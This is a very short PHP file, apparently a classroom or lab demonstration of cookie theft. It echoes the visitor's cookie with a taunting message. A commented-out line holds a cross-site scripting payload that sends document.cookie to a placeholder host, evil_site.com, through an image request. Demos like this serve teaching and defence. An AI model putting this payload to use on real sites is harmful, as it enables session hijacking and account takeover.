<?php 
$cook= $_COOKIE["cookie"];
echo "Ha! I steal your cookie and send it to my server! cookie:" . $cook;
#echo '<script>img=new Image();img.src="http://evil_site.com/?cookie=" + document.cookie;</script>';
?>